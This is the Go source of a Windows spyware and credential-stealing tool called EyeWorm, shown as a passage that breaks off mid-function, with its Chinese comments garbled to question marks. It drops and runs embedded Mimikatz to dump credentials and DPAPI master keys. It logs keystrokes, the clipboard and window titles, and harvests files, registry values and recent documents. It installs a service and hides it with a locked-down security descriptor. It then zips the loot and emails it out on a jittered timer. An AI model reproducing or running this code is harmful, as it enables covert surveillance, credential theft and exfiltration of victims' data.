package main

import (
	"archive/zip"
	"bytes"
	_ "embed"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	ezip "github.com/alexmullins/zip"
	"github.com/kardianos/service"
	lnk "github.com/parsiya/golnk"
	"github.com/shirou/gopsutil/process"
	"golang.org/x/net/html/charset"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"gopkg.in/gomail.v2"
)

type Config struct {
	CConfig            CollectConfig `json:"CollectConfigTable"`
	Timeout            int           `json:"Timeout"`
	TimeU              string        `json:"TimeU"`
	TimeShake          int           `json:"TimeShake"`
	ServiceName        string        `json:"ServiceName"`
	ServiceDisplayName string        `json:"ServiceDisplayName"`
	ServiceDescription string        `json:"ServiceDescription"`
	SpySaveName        string        `json:"SaveFileloc"`
	KeylogSaveloc      string        `json:"KeylogSaveloc"`
	MailHost           string        `json:"Mail_Host"`
	MailPort           int           `json:"Mail_Port"`
	MailSender         string        `json:"Mail_Sender"`
	MailPwd            string        `json:"Mail_Pwd"`
	MailTo             []string      `json:"Mail_To"`
	ZipPwd             string        `json:"ZipPwd"`
	PackTargetFile     bool          `json:"PackTargetFile"`
}

type program struct{}

type CollectConfig struct {
	Collectors []Collector `json:"Collectors"`
}

type Collector struct {
	ShortName          string   `json:"RuleName"`
	OS                 string   `json:"OS"`
	Category           string   `json:"Category"`
	CollectorType      string   `json:"CollectorType"`
	Locations          []string `json:"Locations"`
	ContentKeys        []string `json:"ContentKeys"`
	NameKeys           []string `json:"FileName"`
	SuffixTypes        []string `json:"SuffixTypes"`
	Explain            string   `json:"Explain"`
	Commands           []string `json:"Commands"`
	ProcessName        []string `json:"ProcessName"`
	ReValueNames       []string `json:"RE_ValueNames"`
	ReValueDatas       []string `json:"RE_ValueDatas"`
	FliesScanTargets   []string
	ContentScanTagerts []string
	ContentTargetsPath []string
	TRKNPathResults    []string
	CommandResults     []string
	targetProcessPaths []string
	TRVNResults        []string
	TRVDResults        []string
}

type FlagStruct struct {
	Help         bool
	FilesWorm    bool
	CommandWorm  bool
	ProcessWorm  bool
	RegistryWorm bool
	RecentWorm   bool
	ApiWorm      bool
	RedEye       bool
	Spy          bool
	UnRedEye     bool
	Upload       bool
	O            string
	Keylog       bool
	Masterkey    bool
	All          bool
}

type MimikatzCode struct {
	Name string `json:"Name"`
	Code []byte `json:"Code"`
}

var (
	//go:embed MimiCode.json
	MimiCodeByteValue      []byte
	MimiCode               = MimikatzCode{}
	config                 = Config{}
	flagStruct             = FlagStruct{}
	filesCollectors        []*Collector
	commandCollectors      []*Collector
	processCollectors      []*Collector
	registryCollectors     []*Collector
	recentCollectors       []*Collector
	apiCollertor           Collector
	RcecentTargetLocations []string
	TargetProcesses        []string
	RedCommands            []string
	SpyCommands            []string
	ApiResult              string
	MasterkeyResult        string
	OSaveData              string
	KeylogSavePath         string
)
var (
	ignoreFile = []string{""}
	ignorePath = []string{""}
	ignoreType = []string{""}
)

func ReadConfig() Config {
	path, _ := os.Executable()
	ByteValue := MyReadSource(path, 16, 55)
	var config Config
	json.Unmarshal([]byte(ByteValue), &config)
	return config

}

func ReadMimiCode() MimikatzCode {
	byteValue := MimiCodeByteValue
	var Code MimikatzCode
	json.Unmarshal([]byte(byteValue), &Code)
	return Code
}

func CollectorSuffixinit(coller *Collector) {
	if isInArray(&coller.SuffixTypes, "*") || coller.SuffixTypes == nil || len(coller.SuffixTypes) == 0 {
		coller.SuffixTypes = []string{""}
	}
}
func registryCollectorsInit(rgs []*Collector) []*Collector {
	var registryCollectors []*Collector
	for _, registryCollector := range rgs {
		registryCollector.ReValueNames = append(registryCollector.ReValueNames, "*")
		registryCollectors = append(registryCollectors, registryCollector)
	}
	return registryCollectors
}
func init() {
	config = ReadConfig()
	MimiCode = ReadMimiCode()
	filesCollectors = config.CConfig.FindByType("File")
	commandCollectors = config.CConfig.FindByType("Command")
	processCollectors = config.CConfig.FindByType("Process")
	registryCollectors = config.CConfig.FindByType("Registry")
	recentCollectors = config.CConfig.FindByType("Recent")
	apiCollertor = config.CConfig.FindByShortName("APiWorm")
	registryCollectors = registryCollectorsInit(registryCollectors)
	KeylogSavePath = config.KeylogSaveloc
	for _, filesCollector := range filesCollectors {
		CollectorSuffixinit(filesCollector)
	}
	for _, processCollector := range processCollectors {
		CollectorSuffixinit(processCollector)
	}

	flag.BoolVar(&flagStruct.Help, "help", false, "??????EyeWorm???????????????")
	flag.BoolVar(&flagStruct.FilesWorm, "wfiles", false, "????????????????????????,?????? * ? ?????????????????????a*,a?b,*???,??????????????????")
	flag.BoolVar(&flagStruct.CommandWorm, "wcommands", false, "???????????????cmd????????????????????????...")
	flag.BoolVar(&flagStruct.ProcessWorm, "wprocess", false, "??????Process?????????????????????????????????????????????")
	flag.BoolVar(&flagStruct.RegistryWorm, "wregistry", false, "???????????????????????????????????? locations:????????????????????????,NameKeys:?????????????????????,RE_ValueNames:?????????????????????,RE_ValueDatas:?????????????????????")
	flag.BoolVar(&flagStruct.RecentWorm, "wrecent", false, "??????????????????????????????contentkeys ???namekeys???SuffixTypes???????????? ???recent???????????????????????????????????????????????????????????????????????????????????????????????????????????????filesworm")
	flag.BoolVar(&flagStruct.ApiWorm, "wmimikatz", false, apiCollertor.Explain)
	flag.BoolVar(&flagStruct.RedEye, "redeye", false, "???????????????????????????spy?????????????????????????????????Mail?????????timeout(second ??????min ?????????hour ??????)")
	flag.BoolVar(&flagStruct.Upload, "upload", false, "??????????????????????????????oss????????????")
	flag.BoolVar(&flagStruct.Spy, "spy", false, "??????????????????????????????????????????oos?????????????????????????????????Mail?????????timeout(second ??????min ?????????hour ??????)")
	flag.BoolVar(&flagStruct.UnRedEye, "unred", false, "???????????????????????????")
	flag.BoolVar(&flagStruct.Keylog, "keylog", false, "??????????????????????????????????????????????????????")
	flag.BoolVar(&flagStruct.Masterkey, "dpapi", false, "??????MasterKey")
	flag.BoolVar(&flagStruct.All, "all", false, "??????????????????????????????????????????")
	flag.StringVar(&flagStruct.O, "o", "", "??????????????????????????????????????????")

	flag.Parse()
}

func main() {
	fmt.Println("    ______        __          __              \n   |  ____|       \\ \\        / /                  \n   | |__  _   _  __\\ \\  /\\  / /__  _ __ _ __ ___  \n   |  __|| | | |/ _ \\ \\/  \\/ / _ \\| '__| '_ ` _ \\\n   | |___| |_| |  __/\\  /\\  / (_) | |  | | | | | |\n   |______\\__, |\\___| \\/  \\/ \\___/|_|  |_| |_| |_|\n           __/ |                                  \n          |___/                                   \n  ")
	fmt.Println("???????????? ????????? EyeWorm ?????????????????????....         ???????????????")
	fmt.Println("?????? -help ??????useage")
	if flagStruct.Help {
		flag.Usage()
	}
	if flagStruct.All {
		flagStruct.CommandWorm = true
		flagStruct.FilesWorm = true
		flagStruct.ProcessWorm = true
		flagStruct.RegistryWorm = true
		flagStruct.RecentWorm = true
		flagStruct.ApiWorm = true
	}
	if flagStruct.CommandWorm {
		ComW()
	}
	if flagStruct.FilesWorm {
		FileW()
	}
	if flagStruct.ProcessWorm {
		ProW()
	}
	if flagStruct.RegistryWorm {
		RegistryW()
	}
	if flagStruct.RecentWorm {
		RcenW()
	}
	if flagStruct.ApiWorm {
		WormMimikatz(&apiCollertor)
	}
	if flagStruct.Masterkey {
		WormMasterkey()
	}
	if flagStruct.Spy {
		SpyNow()
	}

	if flagStruct.O != "" {
		SaveFile()
	}
	if flagStruct.RedEye {
		RedEye()
	}
	if flagStruct.Upload {
		UploadData()
	}
	if flagStruct.UnRedEye {
		UnRedEye()
	}
	if flagStruct.Keylog {
		//???????????????
		go clipboardLogger()
		//??????????????????
		go WindowLogger()
		//????????????
		Keylogger()
	}
}
func ComW() {
	for _, commandCollector := range commandCollectors {
		fmt.Println("\n\n\n####################################" + commandCollector.ShortName + "??????????????????##########################################")
		WormCommand(commandCollector)
	}

}
func RcenW() {
	for _, recentCollector := range recentCollectors {
		WormRecent(recentCollector)
	}
}

func RegistryW() {
	for _, registryCollector := range registryCollectors {
		fmt.Println("\n\n\n####################################" + registryCollector.ShortName + "??????????????????##########################################")

		WormRegistry(registryCollector)
	}
}
func ProW() {
	for _, processCollector := range processCollectors {
		fmt.Println("\n\n\n####################################" + processCollector.ShortName + "??????????????????##########################################")
		WormProcesses(TargetProcesses, processCollector)
	}
}
func FileW() {
	flag := false
	for _, filesCollector := range filesCollectors {
		if filesCollector.Locations == nil {
			flag = true
		}
	}
	if flag {
		fmt.Println("??????Type???File??????????????????????????????")
		return
	}
	for _, filesCollector := range filesCollectors {
		fmt.Println("\n\n\n####################################" + filesCollector.ShortName + "??????????????????##########################################")
		WormFiles(filesCollector.Locations, filesCollector)
	}

}
func UnRedEye() {
	svcConfig := &service.Config{
		Name:        config.ServiceName,
		DisplayName: config.ServiceDisplayName,
		Description: config.ServiceDescription,
	}
	UnHideService(svcConfig)
	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		fmt.Errorf(err.Error())
	}
	err1 := s.Uninstall()
	if err1 != nil {
		fmt.Errorf(err1.Error())
		return
	}
	fmt.Println("????????????????????????????????????")
}
func SpyNow() {

	//???????????????
	DoSpy()
	upload()
	tU, err := GetTimeU()
	if err != nil {
		fmt.Errorf(err.Error())
		return
	}
	t := time.NewTicker(tU*time.Duration(config.Timeout) + (time.Second * time.Duration(random(config.TimeShake))))

	defer t.Stop()
	for {
		<-t.C
		t = time.NewTicker(tU*time.Duration(config.Timeout) + (time.Second * time.Duration(random(config.TimeShake))))
		DoSpy()
		upload()

	}
}

func random(Max int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(100)
}

//?????????????????????
func GetRunPath() string {
	file, _ := exec.LookPath(os.Args[0])
	path, _ := filepath.Abs(file)
	index := strings.LastIndex(path, string(os.PathSeparator))
	ret := path[:index]
	return ret + "\\" + fmt.Sprint(os.Args[0])
}

func DoSpy() {
	GetSpyCommand()
	datapath := GetRunPath()
	cmd := exec.Command(datapath, SpyCommands...)
	err := cmd.Run()
	if err != nil {
		fmt.Errorf(err.Error())
		return
	}
	fmt.Println("??????????????????????????????" + config.SpySaveName)
}

func SendGoMail(mailAddress []string, subject string, body string, zip string) error {
	m := gomail.NewMessage()
	// ???????????????????????????????????? nickname??? ??????????????????<code>m.SetHeader("From", MAIL_USER)</code>
	nickname := "gomail"
	m.SetHeader("From", nickname+"<"+config.MailSender+">")
	// ?????????????????????
	m.SetHeader("To", mailAddress...)
	// ??????????????????
	m.SetHeader("Subject", subject)
	m.Attach(zip)
	// ??????????????????
	m.SetBody("text/html", body)
	d := gomail.NewDialer(config.MailHost, config.MailPort, config.MailSender, config.MailPwd)
	// ????????????
	err := d.DialAndSend(m)
	return err
}

// EncryptZip ??????????????????
func EncryptZip(src, desc, password string) error {
	zipfile, err := os.Create(desc)
	if err != nil {
		return err
	}
	defer zipfile.Close()

	archive := ezip.NewWriter(zipfile)
	defer archive.Close()

	filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		header, err := ezip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		header.Name = strings.TrimPrefix(path, filepath.Dir(src)+"/")
		if info.IsDir() {
			header.Name += "/"
		} else {
			header.Method = zip.Deflate
		}
		// ????????????
		header.SetPassword(password)
		writer, err := archive.CreateHeader(header)
		if err != nil {
			return err
		}
		if !info.IsDir() {
			file, err := os.Open(path)
			if err != nil {
				return err
			}
			defer file.Close()
			_, err = io.Copy(writer, file)
		}
		return err
	})
	return err
}
func UploadData() {
	SaveData()
	mailsubject := os.Getenv("USERDOMAIN_ROAMINGPROFILE") + "UserName:" + os.Getenv("USERNAME") + "Remote Result"
	folder := "Result"
	zip := "Result.zip"
	PackFolder(folder)
	EncryptZip(folder, zip, config.ZipPwd)
	SendGoMail(config.MailTo, mailsubject, "this My EyeWorm", zip)
	os.Remove(zip)
	os.RemoveAll(folder)
}

func SaveData() string {
	str := SaveStr()
	location := config.SpySaveName
	os.WriteFile(location, []byte(str), 0600)
	return location
}

func GetTimeU() (time.Duration, error) {

	if config.TimeU == "second" {
		return time.Second, nil
	}
	if config.TimeU == "min" {
		return time.Minute, nil
	}
	if config.TimeU == "hour" {
		return time.Hour, nil
	}
	fmt.Println("config.TimeU:" + config.TimeU)
	return 0, errors.New("time????????????????????????timeU")
}
func upload() {
	mailsubject := os.Getenv("USERDOMAIN_ROAMINGPROFILE") + "UserName:" + os.Getenv("USERNAME") + "Remote Result"
	folder := "Result"
	zip := "Result.zip"
	PackFolder(folder)
	EncryptZip(folder, zip, config.ZipPwd)
	SendGoMail(config.MailTo, mailsubject, "this My EyeWorm", zip)
	os.Remove(zip)
	os.RemoveAll(folder)
}
func PackFolder(folder string) {
	os.MkdirAll(folder, os.ModePerm)
	MyCopy(config.SpySaveName, folder+"/result.txt")
	if flagStruct.Keylog {
		MyCopy(KeylogSavePath, folder+"/keylog.txt")
	}
	if config.PackTargetFile {
		PackUpTarget(folder)
	}
}

func PackUpTarget(folder string) {
	if flagStruct.FilesWorm {
		for _, filesCollector := range filesCollectors {
			for _, file := range filesCollector.FliesScanTargets {
				fname := filepath.Base(file)
				MyCopy(file, folder+"/"+fname)
			}
		}
	}
	if flagStruct.ProcessWorm {
		for _, processCollector := range processCollectors {
			for _, file := range processCollector.FliesScanTargets {
				fname := filepath.Base(file)
				MyCopy(file, folder+"/"+fname)
			}
		}

	}
	if flagStruct.RecentWorm {
		for _, recentCollertor := range recentCollectors {
			for _, file := range recentCollertor.FliesScanTargets {
				fname := filepath.Base(file)
				MyCopy(file, folder+"/"+fname)
			}
		}

	}

}

func MyCopy(str string, dst string) {
	input, err := ioutil.ReadFile(str)
	if err != nil {
		fmt.Println(err)
		return
	}

	err = ioutil.WriteFile(dst, input, 0644)
	if err != nil {
		fmt.Println("Error creating", dst)
		fmt.Println(err)
		return
	}
}

func handleError(err error) {
	fmt.Println("Error:", err)
	os.Exit(-1)
}

func SaveFile() {
	str := SaveStr()
	os.WriteFile(flagStruct.O, []byte(str), 0600)

}
func SaveStr() string {
	var result string
	if flagStruct.FilesWorm {
		for _, filesCollector := range filesCollectors {
			fmt.Println("-------------------------------------------------------------??????------------------------------------------------------------------------")
			result += fmt.Sprintln("==== " + filesCollector.ShortName + " ???????????????????????????====")
			str1 := FmtGet(filesCollector.FliesScanTargets)
			result += str1
			result += fmt.Sprintln("==== " + filesCollector.ShortName + "???????????????????????????====")
			str2 := FmtGet(filesCollector.ContentScanTagerts)
			result += str2
		}
	}
	if flagStruct.CommandWorm {
		result += fmt.Sprintln("====CommandWorm ?????????????????????====")
		for _, commandCollector := range commandCollectors {
			result += fmt.Sprintln("==== " + commandCollector.ShortName + " ?????????????????????====")
			str1 := GetCommandResults(commandCollector.CommandResults)
			result += str1
		}

	}
	if flagStruct.ProcessWorm {
		for _, processCollector := range processCollectors {
			result += fmt.Sprintln("====ProcessWorm ???????????????????????????====")
			str1 := FmtGet(processCollector.FliesScanTargets)
			result += str1
			result += fmt.Sprintln("====ProcessWorm ???????????????????????????====")
			str2 := FmtGet(processCollector.ContentScanTagerts)
			result += str2
		}

	}

	if flagStruct.RegistryWorm {
		for _, registryCollector := range registryCollectors {

			result += fmt.Sprintln("==========RegistryWorm ?????????????????????=========")
			str1 := FmtGet(registryCollector.TRKNPathResults)
			result += str1

			if registryCollector.ReValueNames != nil || len(registryCollector.ReValueNames) != 0 {
				result += fmt.Sprintln("============RegistryWorm ?????????????????????================")
				str1 := FmtGet(registryCollector.TRVNResults)
				result += str1
			}

			if registryCollector.ReValueDatas != nil || len(registryCollector.ReValueDatas) != 0 {
				result += fmt.Sprintln("============RegistryWorm ???????????????????????????============")
				str1 := FmtGet(registryCollector.TRVDResults)
				result += str1
			}
		}

	}

	if flagStruct.RecentWorm {
		for _, recentCollertor := range recentCollectors {
			result += fmt.Sprintln("====RecentWorm ???????????????????????????====")
			str1 := FmtGet(recentCollertor.FliesScanTargets)
			result += str1
			result += fmt.Sprintln("====RecentWorm ???????????????????????????====")
			str2 := FmtGet(recentCollertor.ContentScanTagerts)
			result += str2
		}

	}

	if flagStruct.ApiWorm {
		result += fmt.Sprintln("====ApiWorm ?????????????????????====")
		result += fmt.Sprintln(ApiResult)

	}
	if flagStruct.Masterkey {
		result += fmt.Sprintln("====Masterkey ???????????????====")
		result += fmt.Sprintln(MasterkeyResult)
	}
	return result
}
func RedEye() {

	GetRedCommands()

	svcConfig := &service.Config{
		Name:        config.ServiceName,
		DisplayName: config.ServiceDisplayName,
		Description: config.ServiceDescription,
	}
	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		fmt.Errorf(err.Error())
	}
	err1 := s.Install()
	if err1 != nil {
		fmt.Errorf(err1.Error())
		return
	}
	fmt.Println("??????????????????,????????????!")
	HideService(svcConfig)

	if err = s.Run(); err != nil {
		fmt.Errorf(err.Error())
	}
	SpyNow()
}
func GetSpyCommand() {
	if flagStruct.All {
		SpyCommands = append(SpyCommands, "-all")
	} else {
		if flagStruct.FilesWorm {
			SpyCommands = append(SpyCommands, "-wfiles")
		}
		if flagStruct.CommandWorm {
			SpyCommands = append(SpyCommands, "-wcommands")
		}
		if flagStruct.ProcessWorm {
			SpyCommands = append(SpyCommands, "-wprocess")
		}
		if flagStruct.RegistryWorm {
			SpyCommands = append(SpyCommands, "-wregistry")
		}
		if flagStruct.RecentWorm {
			SpyCommands = append(SpyCommands, "-wrecent")
		}
		if flagStruct.ApiWorm {
			SpyCommands = append(SpyCommands, "-wmimikatz")
		}
	}
	if flagStruct.Masterkey {
		SpyCommands = append(SpyCommands, "-dpapi")
	}

	SpyCommands = append(SpyCommands, "-o="+config.SpySaveName)
}

func GetRedCommands() {
	if flagStruct.All {
		RedCommands = append(RedCommands, "-all")
	} else {
		if flagStruct.FilesWorm {
			RedCommands = append(RedCommands, "-wfiles")
		}
		if flagStruct.CommandWorm {
			RedCommands = append(RedCommands, "-wcommands")
		}
		if flagStruct.ProcessWorm {
			RedCommands = append(RedCommands, "-wprocess")
		}
		if flagStruct.RegistryWorm {
			RedCommands = append(RedCommands, "-wregistry")
		}
		if flagStruct.RecentWorm {
			RedCommands = append(RedCommands, "-wrecent")
		}
		if flagStruct.ApiWorm {
			RedCommands = append(RedCommands, "-wmimikatz")
		}
	}
	if flagStruct.Masterkey {
		RedCommands = append(RedCommands, "-dpapi")
	}
	if flagStruct.Keylog {
		RedCommands = append(RedCommands, "-keylog")
	}
	RedCommands = append(RedCommands, "-spy")
}

//????????????
func (p *program) Start(s service.Service) error {
	go p.run()
	return nil
}

//????????????
func (p *program) run() {

	datapath := GetRunPath()
	cmd := exec.Command(datapath, RedCommands...)
	cmd.Run()
}

//??????
func (p *program) Stop(s service.Service) error {
	return nil
}

func HideService(config *service.Config) {
	cmd := exec.Command("sc.exe", "sdset", config.Name, "D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)'")
	err := cmd.Run()
	if err != nil {
		fmt.Errorf(err.Error())
	}
}
func UnHideService(config *service.Config) {
	cmd := exec.Command("Powershell.exe", "&", "$env:SystemRoot\\System32\\sc.exe", "sdset", config.Name, "'D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)'")
	err := cmd.Run()
	if err != nil {
		fmt.Errorf(err.Error())
	}
}
func WormMasterkey() {
	tagetb := MimiCode.Code

	os.WriteFile("Masterkey.exe", tagetb, 0600)

	cmd := exec.Command("./Masterkey.exe", "privilege::debug", "sekurlsa::dpapi", "exit") //??????masterkey
	out, err := cmd.Output()
	if err != nil {
		fmt.Errorf(err.Error())
	}
	MasterkeyResult = string(out)
	fmt.Println("=================================WormMasterkey ???????????????=====================================")
	fmt.Println(string(out))
	os.Remove("Masterkey.exe")
}
func WormMimikatz(apic *Collector) {
	tagetb := MimiCode.Code
	if !strings.Contains(apic.ProcessName[0], ".exe") {
		apic.ProcessName[0] = "defult.exe"
	}
	os.WriteFile(apic.ProcessName[0], tagetb, 0600)
	apic.Commands = append(apic.Commands, "exit")
	cmd := exec.Command("./"+apic.ProcessName[0], apic.Commands...) ///???????????????????????????
	out, err := cmd.Output()
	if err != nil {
		fmt.Errorf(err.Error())
	}
	ApiResult = string(out)
	fmt.Println("=================================MimikatzWorm ???????????????=====================================")
	fmt.Println(string(out))
	os.Remove(apic.ProcessName[0])
}

func WormRecent(coller *Collector) {
	var recentpath = os.Getenv("APPDATA") + "/Microsoft/Windows/Recent"
	var rfiles []string //Recent ?????? .lnk ??????
	var targetType = []string{""}
	var recentCollertorIndex *Collector = coller
	err := GetAllFile(recentpath, &rfiles, &targetType, &ignoreFile, &ignorePath, &ignoreType)
	if err != nil {
		fmt.Printf(err.Error() + "\n")
	}
	for _, file := range rfiles {
		if path.Ext(file) == ".lnk" {
			if coller.NameKeys == nil || isInArray(&coller.NameKeys, "*") || len(coller.NameKeys) == 0 {
				tureFile := SearchLnk(file)
				if recentCollertorIndex.SuffixTypes == nil || isInArray(&recentCollertorIndex.SuffixTypes, "*") || len(recentCollertorIndex.SuffixTypes) == 0 {
					if !isInArray(&recentCollertorIndex.FliesScanTargets, tureFile) {
						recentCollertorIndex.FliesScanTargets = append(recentCollertorIndex.FliesScanTargets, tureFile) //??????????????????SearchLnk(file)
					}
				} else {
				forsuffix1:
					for _, suffix := range recentCollertorIndex.SuffixTypes {
						if suffix == path.Ext(tureFile) || IsDir(tureFile) {
							if !isInArray(&recentCollertorIndex.FliesScanTargets, tureFile) {
								recentCollertorIndex.FliesScanTargets = append(recentCollertorIndex.FliesScanTargets, tureFile) //??????????????????SearchLnk(file)
							}
							break forsuffix1
						}
					}
				}
			} else {
				for _, key := range coller.NameKeys {
					//???????????????????????????
					fname := filepath.Base(file)
					split := strings.SplitN(fname, ".", 2)
					if find := isMatch(split[0], key); find {
						// ???lnk???????????????????????????
						tureFile := SearchLnk(file)
						if recentCollertorIndex.SuffixTypes == nil || isInArray(&recentCollertorIndex.SuffixTypes, "*") || len(recentCollertorIndex.SuffixTypes) == 0 {
							if !isInArray(&recentCollertorIndex.FliesScanTargets, tureFile) {
								recentCollertorIndex.FliesScanTargets = append(recentCollertorIndex.FliesScanTargets, tureFile) //??????????????????SearchLnk(file)
							}
						} else {
						forsuffix2:
							for _, suffix := range recentCollertorIndex.SuffixTypes {
								if suffix == path.Ext(tureFile) || IsDir(tureFile) {
									if !isInArray(&recentCollertorIndex.FliesScanTargets, tureFile) {
										recentCollertorIndex.FliesScanTargets = append(recentCollertorIndex.FliesScanTargets, tureFile) //??????????????????SearchLnk(file)
									}
									break forsuffix2
								}
							}
						}
					}
				}
			}
		}
	}
	if recentCollertorIndex.ContentKeys != nil && len(recentCollertorIndex.ContentKeys) > 0 {
		if recentCollertorIndex.ContentKeys[0] == "" && len(recentCollertorIndex.ContentKeys) == 1 {
			fmt.Println("==============================================?????????????????????==============================================\n")
			Fmtlog(coller.FliesScanTargets)
			return
		}
		var truefiles []string = recentCollertorIndex.FliesScanTargets
		WormFiles(truefiles, coller)
	} else {
		fmt.Println("==============================================?????????????????????==============================================\n")
		Fmtlog(coller.FliesScanTargets)
	}
}
func SearchLnk(str string) string {

	Lnk, err := lnk.File(str)
	if err != nil {
		panic(err)
	}

	// ????????????????????????????????????????????????
	targetPath, _ := simplifiedchinese.GBK.NewDecoder().String(Lnk.LinkInfo.LocalBasePath)
	return targetPath
}

func WormRegistry(coller *Collector) {
	for _, location := range coller.Locations {
		Hk, spath := GetHKandSpath(location)
		RegistryScan(Hk, spath, coller)
		FatherValueScan(Hk, spath, coller)
	}

	fmt.Println("==================================?????????????????????============================================")
	Fmtlog(coller.TRKNPathResults)

	if coller.ReValueNames != nil || len(coller.ReValueNames) != 0 {
		fmt.Println("==================================?????????????????????============================================")
		Fmtlog(coller.TRVNResults)
	}
	if coller.ReValueDatas != nil || len(coller.ReValueDatas) != 0 {
		fmt.Println("==================================???????????????????????????============================================")
		Fmtlog(coller.TRVDResults)
	}

}

func RegistryScan(Hk registry.Key, spath string, coller *Collector) {
	key, _ := registry.OpenKey(Hk, spath, registry.ALL_ACCESS)

	if coller.NameKeys == nil || isInArray(&coller.NameKeys, "*") || len(coller.NameKeys) == 0 {
		// ???????????????/????????????
		keys, _ := key.ReadSubKeyNames(0)
		//????????????????????????????????????
		for _, sk := range keys {
			s_spath := spath + "\\" + sk
			Path := CombinePath(Hk, s_spath)
			coller.TRKNPathResults = append(coller.TRKNPathResults, Path)
			sonSpath := GetSonSpath(spath, sk)
			RegistryScan(Hk, sonSpath, coller)
		}
		key.Close()
		sonsNameScan(coller)
		//??????????????????/????????????
		// if coller.ReValueNames != nil || len(coller.ReValueNames) != 0 {
		// 	RvlueNameScan(coller)
		// }
		// if coller.ReValueDatas != nil || len(coller.ReValueDatas) != 0 {
		// 	RvlueDataScan(coller)
		// }

	} else {
		//???????????????????????????????????????/????????????
		//?????????
		keys, _ := key.ReadSubKeyNames(0)
		for _, sk := range keys {
			for _, tk := range coller.NameKeys {
				RKeyNamematch(sk, tk, Hk, spath, coller)
				sonSpath := GetSonSpath(spath, sk)
				RegistryScan(Hk, sonSpath, coller)
			}
		}
		key.Close()
		sonsNameScan(coller)
		//??????????????????????????????????????????/????????????
		// if coller.ReValueNames != nil || len(coller.ReValueNames) != 0 {
		// 	RvlueNameScan(coller)
		// }
		// if coller.ReValueDatas != nil || len(coller.ReValueDatas) != 0 {
		// 	RvlueDataScan(coller)
		// }
	}

}
func RvlueDataScan(coller *Collector) {
	for _, path := range coller.TRKNPathResults {
		Hk, spath := GetHKandSpath(path)
		key, _ := registry.OpenKey(Hk, spath, registry.ALL_ACCESS)
		valueNames, _ := key.ReadValueNames(0)
		for _, name := range valueNames {
			if isInArray(&coller.ReValueDatas, "*") {
				data := GetDatas(name, key)
				result := fmt.Sprintf("????????????%v \t\t ????????????%v \t\t ?????????%v\n", path, name, data)
				if !isInArray(&coller.TRVDResults, result) {
					coller.TRVDResults = append(coller.TRVDResults, result)
				}
			} else {
				for _, Tdata := range coller.ReValueDatas {
					RvlueDataMath(path, name, Tdata, key, coller)

				}
			}

		}
		key.Close()
	}
}

func FatherValueScan(Hk registry.Key, spath string, coller *Collector) {
	path := CombinePath(Hk, spath)
	key, _ := registry.OpenKey(Hk, spath, registry.ALL_ACCESS)
	valueNames, _ := key.ReadValueNames(0)
	for _, name := range valueNames {
		data := GetDatas(name, key)
		result := fmt.Sprintf("????????????%v \t\t ????????????%v \t\t ???????????????%v\n", path, name, data)
		if !isInArray(&coller.TRVNResults, result) {
			coller.TRVNResults = append(coller.TRVNResults, result)
		}
	}
}
func sonsNameScan(coller *Collector) {
	for _, path := range coller.TRKNPathResults {
		Hk, spath := GetHKandSpath(path)
		key, _ := registry.OpenKey(Hk, spath, registry.ALL_ACCESS)
		valueNames, _ := key.ReadValueNames(0)
		for _, name := range valueNames {
			data := GetDatas(name, key)
			result := fmt.Sprintf("????????????%v \t\t ????????????%v \t\t ?????????%v\n", path, name, data)
			if !isInArray(&coller.TRVNResults, result) {
				coller.TRVNResults = append(coller.TRVNResults, result)
			}
		}
		key.Close()
	}
}
func RvlueNameScan(coller *Collector) {
	for _, path := range coller.TRKNPathResults {
		Hk, spath := GetHKandSpath(path)
		key, _ := registry.OpenKey(Hk, spath, registry.ALL_ACCESS)
		valueNames, _ := key.ReadValueNames(0)
		for _, name := range valueNames {
			if isInArray(&coller.NameKeys, "*") {
				data := GetDatas(name, key)
				result := fmt.Sprintf("????????????%v \t\t ????????????%v \t\t ?????????%v\n", path, name, data)
				if !isInArray(&coller.TRVNResults, result) {
					coller.TRVNResults = append(coller.TRVNResults, result)
				}
			} else {
				for _, Tname := range coller.ReValueNames {
					RvlueNameMatch(path, name, Tname, key, coller)
				}
			}

		}
		key.Close()
	}

}
func RvlueDataMath(path string, name string, Tdata string, key registry.Key, coller *Collector) {
	data := GetDatas(name, key)
	if strings.Contains(data, Tdata) {
		result := fmt.Sprintf("????????????%v \t\t ????????????%v \t\t ?????????%v\n", path, name, data)
		if !isInArray(&coller.TRVDResults, result) {
			coller.TRVDResults = append(coller.TRVDResults, result)
		}

	}
}
func RvlueNameMatch(path string, name string, Tname string, key registry.Key, coller *Collector) {
	if strings.Contains(name, Tname) {
		data := GetDatas(name, key)
		result := fmt.Sprintf("????????????%v \t\t ????????????%v \t\t ?????????%v\n", path, name, data)

		if !isInArray(&coller.TRVNResults, result) {
			coller.TRVNResults = append(coller.TRVNResults, result)
		}

	}
}
func GetDatas(vlue_name string, key registry.Key) string {
	_, valtype, _ := key.GetValue(vlue_name, nil)
	switch valtype {
	case registry.SZ, registry.EXPAND_SZ:
		val, _, _ := key.GetStringValue(vlue_name)
		return val
	case registry.DWORD, registry.QWORD:
		val, _, _ := key.GetIntegerValue(vlue_name)
		s := strconv.FormatUint(uint64(val), 10)
		return string(s)
	case registry.BINARY:
		val, _, _ := key.GetBinaryValue(vlue_name)
		H := fmt.Sprintf("%x", val)
		return "16Hex:" + H
	case registry.MULTI_SZ:
		val, _, _ := key.GetStringsValue(vlue_name)
		return fmt.Sprint(val)
